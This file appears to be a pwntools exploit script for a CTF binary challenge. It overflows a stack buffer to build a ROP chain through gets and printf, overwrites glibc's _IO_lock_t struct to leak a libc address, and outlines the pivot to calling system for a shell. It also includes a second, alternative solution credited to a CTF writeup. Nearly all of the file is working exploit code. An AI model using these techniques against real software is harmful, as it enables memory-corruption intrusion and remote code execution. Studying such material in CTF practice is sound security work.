from pwn import *
	
elf = context.binary = ELF("chal")
libc = elf.libc


p = process()
# p = remote("challenge.secso.cc", 8004)



ret = 0x000000000040101a

p.sendline(cyclic(0x28) + p64(ret) + p64(elf.plt.gets) + p64(elf.plt.gets) + p64(elf.plt.printf) + p64(elf.sym.main))

"""
typedef struct {
    int lock;
    int cnt;
    void *owner;
} _IO_lock_t;

we are overwrting this struct
we set lock to zero, cnt to anything and owner to anything,
next time we just call gets, it will get into the waiting but the lock is zero so it continues anyway
and we write into the lock so that puts or printf doesnt stop on a null byte 
"""

p.sendline(p32(0) + b"A" * 4 + b"B" * 8)
p.sendline(b"C" * 4) # we write this so printf has bytes to print and not a null byte

p.recvuntil(b"A" * 2)
libc_leak = u64(p.recv(6).ljust(8,p8(0)))
print(hex(libc_leak))

libc_base = libc_leak + 0x28c0
banner = libc_base + 0x1ac180


"""
from here you do normal roping to leak the banner, you still have arb read and write after all
so stack pivot -> read banner -> get libc once
then get back to your script and call system but this time you know libc version and you have a set rdi primitive

"""
# from here after getting libc version, we system our way out

# gdb.attach(p,"""
# b *main+69
# """)
# p.sendline(cyclic(0x28) + p64(ret) + p64(elf.plt.gets)  + p64(elf.plt.printf) + p64(elf.sym.main))
# p.sendline(b"A" * 8 + p64(0))

p.interactive()


if 0:
    # https://jia.je/ctf-writeups/2025-09-19-k17-ctf-2025/u-get-me-write.html
    from pwn import *
    context(arch = "amd64", os = "linux")
    p = process("./chal")
    # p = remote("challenge.secso.cc", 8004)
    libc =  p.libc #ELF("./libc.so.6")
    gets_plt = 0x401060
    puts_plt = 0x401050
    main = 0x401156
    p.recvuntil("Please enter your name: \n")
    p.sendline(b"a"*0x28 + p64(0x040119B) +p64(gets_plt) + p64(gets_plt) + p64(puts_plt) + p64(main))
    p.sendline(b"a"*8+p64(0)) # we set owner to zero so it locks 
    sleep(0.1)
    p.sendline("bbbb") # overwrite for printf

    p.interactive()